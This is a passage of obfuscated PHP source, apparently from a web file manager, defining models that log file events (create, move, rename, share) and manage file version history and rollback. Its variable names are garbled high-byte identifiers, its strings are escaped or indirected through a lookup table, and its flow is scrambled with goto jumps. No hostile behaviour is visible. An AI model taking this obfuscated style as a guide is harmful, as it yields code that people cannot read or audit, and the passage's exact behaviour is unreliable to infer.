$eÃŸµ©Œê²)) { $Aó‹èİÅ¡× = array_sum($dòéŒº‰ï); return; } $AÜÏŒ†è = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto bê¼¯Å¤°¡; BÂÈ˜»¼Ôç: } public function sort($d£Ÿñéä, $BÅ™‹‰êóé) { return parent::update($d£Ÿñéä, $BÅ™‹‰êóé); } } goto D„ÒôÔçà; CÀ¹œ¯ ­ƒ: class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\165\162\143\145\x5f\145\x76\x65\x6e\x74"; protected $dataAuto = array(array("\x63\162\x65\x61\164\x65\x54\151\155\145", "\164\x69\x6d\145", "\151\156\163\x65\x72\x74", "\x66\x75\156\x63\x74\x69\157\x6e"), array("\x64\x65\163\x63", '', "\x69\x6e\x73\145\x72\164\x2c\x75\160\x64\x61\164\x65\x2c\163\x65\x6c\x65\143\164", "\x6a\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($e¸¾ÔÉ¨ÏÊ, $DâçŒ‡Ûèô, $Cµáğ¾ñõ = '') { goto b¸µ´ÓÀÛŒ; f–ñˆŒ¢¯Æ: if (!$C˜§»›áÖº) { return !1; } if ($this->isCacheEvent($C˜§»›áÖº, $DâçŒ‡Ûèô)) { return; } if ($Cµáğ¾ñõ && is_string($Cµáğ¾ñõ)) { $Cµáğ¾ñõ = array($a”‚•«ÉŒÆ[1725] => $Cµáğ¾ñõ); } goto d¾ïèÖ–«ƒ; d¾ïèÖ–«ƒ: $DÉ¼Ş®Ãì› = array($a”‚•«ÉŒÆ[410] => $e¸¾ÔÉ¨ÏÊ, $a”‚•«ÉŒÆ[1900] => $C˜§»›áÖº[$a”‚•«ÉŒÆ[478]], $a”‚•«ÉŒÆ[1901] => $C˜§»›áÖº[$a”‚•«ÉŒÆ[28]], $a”‚•«ÉŒÆ[495] => !empty($C˜§»›áÖº[$a”‚•«ÉŒÆ[495]]) ? $C˜§»›áÖº[$a”‚•«ÉŒÆ[495]] : $a”‚•«ÉŒÆ[33], $a”‚•«ÉŒÆ[1520] => USER_ID, $a”‚•«ÉŒÆ[415] => $DâçŒ‡Ûèô, $a”‚•«ÉŒÆ[1522] => $Cµáğ¾ñõ); $this->addSystemLog($DâçŒ‡Ûèô, $DÉ¼Ş®Ãì›); unset($DÉ¼Ş®Ãì›[$a”‚•«ÉŒÆ[1901]], $DÉ¼Ş®Ãì›[$a”‚•«ÉŒÆ[495]]); goto CğÔ¹ÛÉ‘; CğÔ¹ÛÉ‘: return $this->add($DÉ¼Ş®Ãì›); goto bƒ™æèÅ™á; b¸µ´ÓÀÛŒ: $a”‚•«ÉŒÆ =& $_SERVER[œº]; if (!$this->eventSave) { return; } $C˜§»›áÖº = Model($a”‚•«ÉŒÆ[1206])->sourceInfo($e¸¾ÔÉ¨ÏÊ); goto f–ñˆŒ¢¯Æ; bƒ™æèÅ™á: } private function addSystemLog($Fß‚Ú¦»íì, $CÚ­›æ‘Äñ) { $cÄ‡Õ«İ =& $_SERVER[œº]; if ($Fß‚Ú¦»íì == $cÄ‡Õ«İ[1902]) { $Fß‚Ú¦»íì = $CÚ­›æ‘Äñ[$cÄ‡Õ«İ[431]][$cÄ‡Õ«İ[1903]]; } else { if (in_array($Fß‚Ú¦»íì, array($cÄ‡Õ«İ[1669], $cÄ‡Õ«İ[1904]))) { $Fß‚Ú¦»íì = $CÚ­›æ‘Äñ[$cÄ‡Õ«İ[431]][$cÄ‡Õ«İ[715]]; } } $dÒ®ƒ¯’ƒ = array_merge($CÚ­›æ‘Äñ, array($cÄ‡Õ«İ[1905] => $CÚ­›æ‘Äñ[$cÄ‡Õ«İ[395]], $cÄ‡Õ«İ[1906] => $CÚ­›æ‘Äñ[$cÄ‡Õ«İ[1906]])); Model($cÄ‡Õ«İ[1633])->addLog($cÄ‡Õ«İ[1907] . $Fß‚Ú¦»íì, $dÒ®ƒ¯’ƒ); } private function isCacheEvent($F‡Ê¹é™š¼, $A’Äï³¿í×) { if ($F‡Ê¹é™š¼[$_SERVER[œº][404]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($cĞ¨ÑœöªÏ, $EÅÃ¢ˆ¤®´) { $F—ö–È…” =& $_SERVER[œº]; $AóçöáØ¹µ = Model($F—ö–È…”[1206])->sourceInfo($cĞ¨ÑœöªÏ); $FÆã÷İ£¯£ = array($F—ö–È…”[1903] => $EÅÃ¢ˆ¤®´, $F—ö–È…”[28] => $AóçöáØ¹µ[$F—ö–È…”[28]]); return $this->addEvent($cĞ¨ÑœöªÏ, $F—ö–È…”[1902], $FÆã÷İ£¯£); } public function eventFileEdit($b±åÒ¬‚Ï) { $A©ÕÈ©äÑ× =& $_SERVER[œº]; $b“¿¶äßĞá = array($A©ÕÈ©äÑ×[1908] => $_SERVER[$A©ÕÈ©äÑ×[1909]], $A©ÕÈ©äÑ×[1910] => strtolower(ACTION)); return $this->addEvent($b±åÒ¬‚Ï, $A©ÕÈ©äÑ×[1659], $b“¿¶äßĞá); } public function eventRecycle($Eìƒ¡˜Üß, $d¥Õâˆİ¾) { return $this->addEvent($Eìƒ¡˜Üß, $_SERVER[œº][1904], $d¥Õâˆİ¾); } public function eventRemove($E½Ç†± ƒ) { $AªŒåã«ƒ =& $_SERVER[œº]; $b”¤§ª´‘Û = Model($AªŒåã«ƒ[1206])->sourceInfo($E½Ç†± ƒ); $b¿å‚Š¾È‹ = $b”¤§ª´‘Û[$AªŒåã«ƒ[28]]; return $this->addEvent($b”¤§ª´‘Û[$AªŒåã«ƒ[478]], $AªŒåã«ƒ[1658], $b¿å‚Š¾È‹); } public function eventShare($Fø™ÎÚ—®š, $a…¥ÌÈîå›) { return $this->addEvent($Fø™ÎÚ—®š, $_SERVER[œº][1669], $a…¥ÌÈîå›); } public function eventMove($Eí» •ŠËö, $E¯¨›Æ¥ß, $Dò°ô—ïøè) { goto cì…ï”ë; Cå¹°±ï• : $this->addEvent($E¯¨›Æ¥ß, $E÷›Ê²¸Œ½[1914], $D­Ä‘®·‘Ş); goto fÀ•÷¾ÚÀÎ; cì…ï”ë: $E÷›Ê²¸Œ½ =& $_SERVER[œº]; $e×Ã³˜ = Model($E÷›Ê²¸Œ½[1206]); $DÅä•Ø¯‡’ = $e×Ã³˜->sourceInfo($Eí» •ŠËö); goto F‡ˆéõÖÙ„; F‡ˆéõÖÙ„: $aÅ¥Œ„ºÁØ = $e×Ã³˜->sourceInfo($E¯¨›Æ¥ß); $F˜øŸÈùØ‡ = $e×Ã³˜->sourceInfo($Dò°ô—ïøè); $D­Ä‘®·‘Ş = array($E÷›Ê²¸Œ½[1055] => $E¯¨›Æ¥ß, $E÷›Ê²¸Œ½[1911] => $aÅ¥Œ„ºÁØ[$E÷›Ê²¸Œ½[28]], $E÷›Ê²¸Œ½[1891] => !empty($aÅ¥Œ„ºÁØ[$E÷›Ê²¸Œ½[495]]) ? $aÅ¥Œ„ºÁØ[$E÷›Ê²¸Œ½[495]] : $E÷›Ê²¸Œ½[33], $E÷›Ê²¸Œ½[1056] => $Dò°ô—ïøè, $E÷›Ê²¸Œ½[1912] => $F˜øŸÈùØ‡[$E÷›Ê²¸Œ½[28]], $E÷›Ê²¸Œ½[1913] => !empty($F˜øŸÈùØ‡[$E÷›Ê²¸Œ½[495]]) ? $F˜øŸÈùØ‡[$E÷›Ê²¸Œ½[495]] : $E÷›Ê²¸Œ½[33]); goto f¤ÚÒ×§òÎ; f¤ÚÒ×§òÎ: $this->addEvent($Eí» •ŠËö, $E÷›Ê²¸Œ½[520], $D­Ä‘®·‘Ş); $DÅä•Ø¯‡’ = $e×Ã³˜->sourceInfo($Eí» •ŠËö); $D­Ä‘®·‘Ş = array($E÷›Ê²¸Œ½[395] => $DÅä•Ø¯‡’[$E÷›Ê²¸Œ½[395]], $E÷›Ê²¸Œ½[28] => $DÅä•Ø¯‡’[$E÷›Ê²¸Œ½[28]]); goto Cå¹°±ï• ; fÀ•÷¾ÚÀÎ: } public function eventCopy($eÌ‰ï™›È) { $this->eventCreate($eÌ‰ï™›È, $_SERVER[œº][518]); } public function eventRename($bÚÃ¹†ØáÏ, $aˆªÆ‹Ññ, $Eîºçƒ‘ÔË) { $Aà¸ÑãŸÊˆ =& $_SERVER[œº]; $bì²Âßï†Ó = array($Aà¸ÑãŸÊˆ[1055] => $aˆªÆ‹Ññ, $Aà¸ÑãŸÊˆ[1056] => $Eîºçƒ‘ÔË); return $this->addEvent($bÚÃ¹†ØáÏ, $Aà¸ÑãŸÊˆ[1220], $bì²Âßï†Ó); } public function eventAddComment($FÑ¿À¹ƒ’…, $F•ÅÃÅ„è) { return $this->addEvent($FÑ¿À¹ƒ’…, $_SERVER[œº][1915], $F•ÅÃÅ„è); } public function eventAddDesc($B³ˆ‘ê‹ñŸ, $Aä´ÇïÚ) { return $this->addEvent($B³ˆ‘ê‹ñŸ, $_SERVER[œº][1916], $Aä´ÇïÚ); } public function listBySource($dÅ“‘·‡È…) { goto A¬Ìà©‚§¤; CÕˆ’§©Ë: if ($e‹ª‚»àÕ[$E¾ëÒ¹ö[403]] == $E¾ëÒ¹ö[87]) { $f‘ïåšìõ¦ = Model($E¾ëÒ¹ö[1206])->listSearchChildren($dÅ“‘·‡È…, 20000); $f‘ïåšìõ¦[] = $dÅ“‘·‡È… . $E¾ëÒ¹ö[375]; $C¿à¡”Ñ® = array($E¾ëÒ¹ö[395] => array($E¾ëÒ¹ö[7], $f‘ïåšìõ¦)); } $fÛ²ôË™Ô’ = $this->where($C¿à¡”Ñ®)->order($E¾ëÒ¹ö[1917])->selectPage(); if ($fÛ²ôË™Ô’[$E¾ëÒ¹ö[364]][$E¾ëÒ¹ö[365]] == 0) { $fÛ²ôË™Ô’[$E¾ëÒ¹ö[364]][$E¾ëÒ¹ö[365]] = 1; $fÛ²ôË™Ô’[$E¾ëÒ¹ö[367]] = array(array($E¾ëÒ¹ö[410] => $dÅ“‘·‡È…, $E¾ëÒ¹ö[1900] => $e‹ª‚»àÕ[$E¾ëÒ¹ö[478]], $E¾ëÒ¹ö[1520] => $e‹ª‚»àÕ[$E¾ëÒ¹ö[432]], $E¾ëÒ¹ö[415] => $E¾ëÒ¹ö[1918], $E¾ëÒ¹ö[416] => $e‹ª‚»àÕ[$E¾ëÒ¹ö[194]], $E¾ëÒ¹ö[1522] => $E¾ëÒ¹ö[33])); } goto cğÈÓÑ„¦ù; cğÈÓÑ„¦ù: return $this->eventListParse($fÛ²ôË™Ô’, $dÅ“‘·‡È…); goto D„µìÀ©Á÷; A¬Ìà©‚§¤: $E¾ëÒ¹ö =& $_SERVER[œº]; $e‹ª‚»àÕ = Model($E¾ëÒ¹ö[1206])->sourceInfo($dÅ“‘·‡È…); $C¿à¡”Ñ® = array($E¾ëÒ¹ö[410] => $dÅ“‘·‡È…); goto CÕˆ’§©Ë; D„µìÀ©Á÷: } private function eventListParse($EÎÁù°¥£¬, $Fæá‘òÕëİ) { goto A±öòË»È; A±öòË»È: $aÌ¯’Ãç¹ =& $_SERVER[œº]; $dÑÔŒÙƒ å = $EÎÁù°¥£¬[$aÌ¯’Ãç¹[367]]; $CÚ¿çŠšÄÙ = array_to_keyvalue($dÑÔŒÙƒ å, $aÌ¯’Ãç¹[33], $aÌ¯’Ãç¹[395]); goto D£Ëî…“¢Î; D£Ëî…“¢Î: $eÀ»ØÎ„¼† = array_to_keyvalue($dÑÔŒÙƒ å, $aÌ¯’Ãç¹[33], $aÌ¯’Ãç¹[1906]); foreach ($dÑÔŒÙƒ å as $cÀ‡·¿‚ñ–) { $eÆ¢ĞµìÂ– = $cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[431]]; if ($cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[29]] == $aÌ¯’Ãç¹[520] && isset($eÆ¢ĞµìÂ–[$aÌ¯’Ãç¹[1055]])) { $CÚ¿çŠšÄÙ[] = $eÆ¢ĞµìÂ–[$aÌ¯’Ãç¹[1055]] . $aÌ¯’Ãç¹[33]; $CÚ¿çŠšÄÙ[] = $eÆ¢ĞµìÂ–[$aÌ¯’Ãç¹[1056]] . $aÌ¯’Ãç¹[33]; } if ($cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[29]] == $aÌ¯’Ãç¹[1914] && isset($eÆ¢ĞµìÂ–[$aÌ¯’Ãç¹[395]])) { $CÚ¿çŠšÄÙ[] = $eÆ¢ĞµìÂ–[$aÌ¯’Ãç¹[395]] . $aÌ¯’Ãç¹[33]; } } $CÚ¿çŠšÄÙ = array_merge($CÚ¿çŠšÄÙ, $eÀ»ØÎ„¼†, array($Fæá‘òÕëİ . $aÌ¯’Ãç¹[33])); goto cë‚Şß£Öñ; c‘Ê²î‚÷: $EÎÁù°¥£¬[$aÌ¯’Ãç¹[367]] = $dÑÔŒÙƒ å; return $EÎÁù°¥£¬; goto FÕ¹–‚Â; eˆğá–†ëí: $Bˆò°¨˜’ = Model($aÌ¯’Ãç¹[790])->sourceListInfo($CÚ¿çŠšÄÙ, !0); foreach ($dÑÔŒÙƒ å as &$cÀ‡·¿‚ñ–) { if ($cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[29]] == $aÌ¯’Ãç¹[520] && isset($cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[431]][$aÌ¯’Ãç¹[1055]])) { $cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[431]][$aÌ¯’Ãç¹[1055]] = $Bˆò°¨˜’[$cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[431]][$aÌ¯’Ãç¹[1055]]]; $cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[431]][$aÌ¯’Ãç¹[1056]] = $Bˆò°¨˜’[$cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[431]][$aÌ¯’Ãç¹[1056]]]; } if ($cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[29]] == $aÌ¯’Ãç¹[1914] && isset($cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[431]][$aÌ¯’Ãç¹[395]])) { $cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[431]][$aÌ¯’Ãç¹[395]] = $Bˆò°¨˜’[$cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[431]][$aÌ¯’Ãç¹[395]]]; } $cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[85]] = $Bˆò°¨˜’[$cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[395]]]; $cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[1919]] = $Bˆò°¨˜’[$cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[1906]]]; if ($cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[29]] == $aÌ¯’Ãç¹[1658]) { $cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[1919]] = $cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[85]]; $cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[1906]] = $cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[1919]][$aÌ¯’Ãç¹[395]]; $cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[85]] = !1; $cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[395]] = $aÌ¯’Ãç¹[33]; } $cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[1849]] = $d¸ ÉÕ‰‘‘[$cÀ‡·¿‚ñ–[$aÌ¯’Ãç¹[1528]]]; } unset($cÀ‡·¿‚ñ–); goto c‘Ê²î‚÷; cë‚Şß£Öñ: $CÚ¿çŠšÄÙ = array_unique($CÚ¿çŠšÄÙ); $d§Ğ–ï„òÔ = array_unique(array_to_keyvalue($dÑÔŒÙƒ å, $aÌ¯’Ãç¹[33], $aÌ¯’Ãç¹[1528])); $d¸ ÉÕ‰‘‘ = Model($aÌ¯’Ãç¹[506])->userListInfo($d§Ğ–ï„òÔ); goto eˆğá–†ëí; FÕ¹–‚Â: } public function removeBySource($EÜ¬¨˜…‘Ş) { $CóÇã£ä’› = array($_SERVER[œº][410] => $EÜ¬¨˜…‘Ş); $this->where($CóÇã£ä’›)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\165\x72\x63\x65\137\150\151\x73\x74\x6f\162\x79"; public function historyCount($E­¹¹•ˆõ) { goto Eèº½½ÜÉÃ; Eèº½½ÜÉÃ: $FµˆÉ½‡Ç =& $_SERVER[œº]; if (!$E­¹¹•ˆõ) { return array(); } if (is_string($E­¹¹•ˆõ) || is_int($E­¹¹•ˆõ)) { $E­¹¹•ˆõ = array($E­¹¹•ˆõ); } goto AÀé—â¿›ì; AÀé—â¿›ì: $Bé·ÙàˆìÖ = array($FµˆÉ½‡Ç[395], $FµˆÉ½‡Ç[1724] => $FµˆÉ½‡Ç[480]); $e´ÔŒĞÇ­› = array($FµˆÉ½‡Ç[395] => array($FµˆÉ½‡Ç[7], $E­¹¹•ˆõ)); $CéìŠ…Ì = $this->field($Bé·ÙàˆìÖ)->where($e´ÔŒĞÇ­›)->group($FµˆÉ½‡Ç[395])->select(); goto Cõ‡°ÄÀÎ; Cõ‡°ÄÀÎ: return array_to_keyvalue($CéìŠ…Ì, $FµˆÉ½‡Ç[395], $FµˆÉ½‡Ç[480]); goto BÇœ¡×È–Î; BÇœ¡×È–Î: } public function addHistory($CÌ‹®îØ¯ê, $bŠè¬Öá”Ë = '') { $AÈšÂä‹ƒÜ =& $_SERVER[œº]; $Eç˜É¦ğ¼é = array($AÈšÂä‹ƒÜ[410] => $CÌ‹®îØ¯ê[$AÈšÂä‹ƒÜ[395]], $AÈšÂä‹ƒÜ[1520] => isset($CÌ‹®îØ¯ê[$AÈšÂä‹ƒÜ[434]]) ? $CÌ‹®îØ¯ê[$AÈšÂä‹ƒÜ[434]] : $CÌ‹®îØ¯ê[$AÈšÂä‹ƒÜ[432]], $AÈšÂä‹ƒÜ[448] => $CÌ‹®îØ¯ê[$AÈšÂä‹ƒÜ[447]], $AÈšÂä‹ƒÜ[548] => $CÌ‹®îØ¯ê[$AÈšÂä‹ƒÜ[78]], $AÈšÂä‹ƒÜ[1920] => $bŠè¬Öá”Ë); $D×è¾Ò‘º— = $GLOBALS[$AÈšÂä‹ƒÜ[6]][$AÈšÂä‹ƒÜ[88]][$AÈšÂä‹ƒÜ[1104]]; if ($D×è¾Ò‘º— > 1) { $this->historyAutoClear($Eç˜É¦ğ¼é[$AÈšÂä‹ƒÜ[395]]); $this->add($Eç˜É¦ğ¼é); } Hook::trigger($AÈšÂä‹ƒÜ[1921], $Eç˜É¦ğ¼é); Model($AÈšÂä‹ƒÜ[1922])->eventFileEdit($CÌ‹®îØ¯ê[$AÈšÂä‹ƒÜ[395]]); } private function historyAutoClear($eáêãÂø¿ù) { goto A–íÉ‘å¹; A–íÉ‘å¹: $a åªÔ·¥† =& $_SERVER[œº]; $eøŠ—éÓä = Model($a åªÔ·¥†[730])->get($a åªÔ·¥†[1126]); $B…ÀÇ˜Ê‰æ = $GLOBALS[$a åªÔ·¥†[6]][$a åªÔ·¥†[88]][$a åªÔ·¥†[1104]]; goto bâæÅß…¹; AšğÑ‘Ç¿: $fÃî”‹İ = array_slice($fÃî”‹İ, $fàÈŠòñêŠ); if (!$Fà‰°î„“ || !$fÃî”‹İ) { return; } $bÌ¬ÂÛï˜ = array($a åªÔ·¥†[412] => array($a åªÔ·¥†[7], $Fà‰°î„“)); goto eñ‹Ãíå™š; Fí¥öˆçŒ: $Fà‰°î„“ = array_to_keyvalue($bŒ¬¬îêõÛ, $a åªÔ·¥†[33], $a åªÔ·¥†[393]); $Fà‰°î„“ = array_slice($Fà‰°î„“, $fàÈŠòñêŠ); $fÃî”‹İ = array_to_keyvalue($bŒ¬¬îêõÛ, $a åªÔ·¥†[33], $a åªÔ·¥†[447]); goto AšğÑ‘Ç¿; b¶¤…¸Á›³: $bÌ¬ÂÛï˜ = array($a åªÔ·¥†[410] => $eáêãÂø¿ù); $bŒ¬¬îêõÛ = $this->field($a åªÔ·¥†[1923])->where($bÌ¬ÂÛï˜)->order($a åªÔ·¥†[1917])->select(); if (!$bŒ¬¬îêõÛ || $fàÈŠòñêŠ >= count($bŒ¬¬îêõÛ)) { return; } goto Fí¥öˆçŒ; eñ‹Ãíå™š: $this->where($bÌ¬ÂÛï˜)->delete(); Model($a åªÔ·¥†[450])->remove($fÃî”‹İ); goto eßÒ©ù¼¶; bâæÅß…¹: $fàÈŠòñêŠ = $eøŠ—éÓä == $a åªÔ·¥†[1127] ? 5 : $B…ÀÇ˜Ê‰æ; if ($B…ÀÇ˜Ê‰æ <= 1) { $fàÈŠòñêŠ = 1; } if ($fàÈŠòñêŠ >= 500) { return; } goto b¶¤…¸Á›³; eßÒ©ù¼¶: } public function listData($eëçĞÊŞâ´) { goto E¶ÑØÚ£½; fê†ˆ¤‰: $e·é˜ºÇ†İ = $this->field($FŒƒ„ïÇâ)->where($A‹×êŒó›Ğ)->order($aÂíØµòƒÆ[1917])->selectPage(); $this->_listAppendUser($e·é˜ºÇ†İ[$aÂíØµòƒÆ[367]]); $Aµ»Ëï¥ºÖ = Model($aÂíØµòƒÆ[730])->get($aÂíØµòƒÆ[1126]); goto fá™Ì°¥; E¶ÑØÚ£½: $aÂíØµòƒÆ =& $_SERVER[œº]; $A‹×êŒó›Ğ = array($aÂíØµòƒÆ[410] => $eëçĞÊŞâ´); $FŒƒ„ïÇâ = $aÂíØµòƒÆ[1924]; goto fê†ˆ¤‰; fá™Ì°¥: $e¤·ï›ŒÖä = 5; if ($Aµ»Ëï¥ºÖ == $aÂíØµòƒÆ[1127]) { $e·é˜ºÇ†İ[$aÂíØµòƒÆ[367]] = array_slice($e·é˜ºÇ†İ[$aÂíØµòƒÆ[367]], 0, $e¤·ï›ŒÖä); $e·é˜ºÇ†İ[$aÂíØµòƒÆ[364]] = array($aÂíØµòƒÆ[1925] => 1, $aÂíØµòƒÆ[1926] => 20, $aÂíØµòƒÆ[1927] => 1, $aÂíØµòƒÆ[1928] => count($e·é˜ºÇ†İ[$aÂíØµòƒÆ[367]])); } return $e·é˜ºÇ†İ; goto E×™õ® è½; E×™õ® è½: } protected function _listAppendUser(&$FÆ³’é…) { $E‰ÄĞÇñœÕ =& $_SERVER[œº]; $d ‘™¥Å ª = array_to_keyvalue($FÆ³’é…, $E‰ÄĞÇñœÕ[33], $E‰ÄĞÇñœÕ[1528]); $f›©‹éµæÇ = Model($E‰ÄĞÇñœÕ[506])->userListInfo($d ‘™¥Å ª); foreach ($FÆ³’é… as &$dÍŠöËÖÃ¹) { $Dä¸íÙñğ = $dÍŠöËÖÃ¹[$E‰ÄĞÇñœÕ[1528]]; $dÍŠöËÖÃ¹[$E‰ÄĞÇñœÕ[432]] = $f›©‹éµæÇ[$Dä¸íÙñğ] ? $f›©‹éµæÇ[$Dä¸íÙñğ] : !1; } unset($dÍŠöËÖÃ¹); } public function fileInfo($dœ¸Ì¿Ÿô‡) { $d¾ñ²‹¼‚ =& $_SERVER[œº]; $D±×†±ßÎ = $this->tablePrefix; $CÓÎí—Ì½í = "{$D±×†±ßÎ}\x69\157\x5f\146\151\x6c\x65\x20\146\151\154\x65\x73\x20\157\156\x20\x66\x69\154\x65\163\x2e\146\151\154\x65\111\104\40\75\40\150\x69\163\164\157\x72\171\x2e\146\x69\154\145\111\104"; return $this->alias($d¾ñ²‹¼‚[1929])->where(array($d¾ñ²‹¼‚[412] => $dœ¸Ì¿Ÿô‡))->join($CÓÎí—Ì½í, $d¾ñ²‹¼‚[1930])->find(); } public function removeItem($Bå¿¥°î„£) { $FÖŠº‰ô‘Ã =& $_SERVER[œº]; $fÑå¹œöòŞ = array($FÖŠº‰ô‘Ã[412] => $Bå¿¥°î„£); $c©µ¹«Š¢Î = $this->where($fÑå¹œöòŞ)->find(); if ($c©µ¹«Š¢Î) { $AÀÜƒÛÓö‚ = $this->where($fÑå¹œöòŞ)->delete(); Model($FÖŠº‰ô‘Ã[450])->remove($c©µ¹«Š¢Î[$FÖŠº‰ô‘Ã[447]]); return $AÀÜƒÛÓö‚; } return !1; } public function removeBySource($CÕ¸Õ‘ñ…‘) { goto d…í¿Ì¦; Dš™ÏÛæò£: $CìéÚ­Ò¡¿ = array($fªìÚí«†[410] => array($fªìÚí«†[7], $CÕ¸Õ‘ñ…‘)); $eÄÓ‡Œƒ¬ = $this->field($fªìÚí«†[448])->where($CìéÚ­Ò¡¿)->select(); if ($eÄÓ‡Œƒ¬) { $this->where($CìéÚ­Ò¡¿)->delete(); $c…ÏØåÇ¯“ = array_to_keyvalue($eÄÓ‡Œƒ¬, $fªìÚí«†[33], $fªìÚí«†[447]); Model($fªìÚí«†[450])->remove($c…ÏØåÇ¯“); } goto CƒÏ±È›‹’; CƒÏ±È›‹’: return !0; goto DÄ½çœĞœ»; d…í¿Ì¦: $fªìÚí«† =& $_SERVER[œº]; if (!$CÕ¸Õ‘ñ…‘) { return !1; } if (!is_array($CÕ¸Õ‘ñ…‘)) { $CÕ¸Õ‘ñ…‘ = array($CÕ¸Õ‘ñ…‘); } goto Dš™ÏÛæò£; DÄ½çœĞœ»: } public function setDetail($cËö¸‚ëŠã, $C¬‘ÏÂøä) { $bÎî¿‚¦¿™ =& $_SERVER[œº]; return $this->where(array($bÎî¿‚¦¿™[412] => $cËö¸‚ëŠã))->save(array($bÎî¿‚¦¿™[1920] => $C¬‘ÏÂøä)); } public function rollbackToItem($B£®°ÅÀÊÅ, $AËÛÛØ†²²) { goto F‡ğ‰ÍÑåè; AõÁÄ¡à: $e­½æõäÍ = $this->find($AËÛÛØ†²²); $F¸ùÒÔÎ­À = array($Aâ”‹˜Å˜Ñ[447] => $e­½æõäÍ[$Aâ”‹˜Å˜Ñ[447]], $Aâ”‹˜Å˜Ñ[78] => $e­½æõäÍ[$Aâ”‹˜Å˜Ñ[78]], $Aâ”‹˜Å˜Ñ[84] => time(), $Aâ”‹˜Å˜Ñ[434] => USER_ID); Model($Aâ”‹˜Å˜Ñ[790])->where(array($Aâ”‹˜Å˜Ñ[395] => $B£®°ÅÀÊÅ))->save($F¸ùÒÔÎ­À); goto AøçğµêÏ¥; F‡ğ‰ÍÑåè: $Aâ”‹˜Å˜Ñ =& $_SERVER[œº]; $ağñ·ªÛ¦‹ = Model($Aâ”‹˜Å˜Ñ[790])->sourceInfo($B£®°ÅÀÊÅ); $this->addHistory($ağñ·ªÛ¦‹, LNG($Aâ”‹˜Å˜Ñ[1931])); goto AõÁÄ¡à; AøçğµêÏ¥: return $this->where(array($Aâ”‹˜Å˜Ñ[412] => $AËÛÛØ†²²))->delete(); goto EÚïÂ›¦Ü¨; EÚïÂ›¦Ü¨: } public function clearSame($A…æÍˆóÔ¬) { goto Eİáõ²‚šÖ; eĞ…¦˜³åó: $B£»Î¬“¼… = array(); $B—ƒ“š‰¬é = array(); foreach ($b–ò•Ã˜ as $aô­öŠİ•) { if (!$aô­öŠİ• || count($aô­öŠİ•) <= 1) { continue; } foreach ($aô­öŠİ• as $e…öÒØ÷ò¨) { $B£»Î¬“¼…[] = $e…öÒØ÷ò¨[$DËî©Åë‚¦[447]]; $B—ƒ“š‰¬é[] = $e…öÒØ÷ò¨[$DËî©Åë‚¦[393]]; } } goto FîšËªÉˆ; Eİáõ²‚šÖ: $DËî©Åë‚¦ =& $_SERVER[œº]; $EÀ–¦Ÿ… = $this->listData($A…æÍˆóÔ¬); $b–ò•Ã˜ = array_to_keyvalue_group($EÀ–¦Ÿ…, $DËî©Åë‚¦[447]); goto eĞ…¦˜³åó; FîšËªÉˆ: if (!$B—ƒ“š‰¬é) { return; } $this->where(array($DËî©Åë‚¦[393] => array($DËî©Åë‚¦[7], $B—ƒ“š‰¬é)))->delete(); Model($DËî©Åë‚¦[450])->remove($B£»Î¬“¼…); goto f¿ğğ†ëË…; f¿ğğ†ëË…: } public function userSpace() { $D°ÇöÁÂ¸½ =& $_SERVER[œº]; $EÖ§©øœšÃ = $this->tablePrefix; $cª±í£‘² = array($D°ÇöÁÂ¸½[1520] => USER_ID); $e¥øçŠóææ = "{$EÖ§©øœšÃ}\x69\x6f\137\x66\x69\x6c\145\40\146\151\154\145\163\40\157\156\x20\146\151\154\x65\163\56\146\151\154\145\x49\x44\x20\75\x20\150\x69\163\164\x6f\162\x79\56\x66\151\x6c\x65\111\104"; return $this->alias($D°ÇöÁÂ¸½[1929])->where($cª±í£‘²)->join($e¥øçŠóææ, $D°ÇöÁÂ¸½[1930])->sum($D°ÇöÁÂ¸½[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Fóßùéò‹) { goto FœÇ‚²‚‡; ešÎ²ÅÖ»¶: if (!$A‚åÖØëÃ¦[$E·ô–‡›ƒ´[168]]) { $eòÉÜƒ¦ì½ = array_to_keyvalue($dŠÁâœ‚ç, $E·ô–‡›ƒ´[33], $E·ô–‡›ƒ´[168]); $Dš‹ ¢Áä… = implode($E·ô–‡›ƒ´[47], $eòÉÜƒ¦ì½); $fËßÏ ¢« = $E·ô–‡›ƒ´[1932]; } $A’‡˜Œ’–‚ = explode($E·ô–‡›ƒ´[47], trim($Dš‹ ¢Áä…, $E·ô–‡›ƒ´[47])); return array($fËßÏ ¢«, $A’‡˜Œ’–‚); goto cê¤¸×ô§¾; D¹ù„è¹: if (!$A‚åÖØëÃ¦) { return array(); } $Dš‹ ¢Áä… = 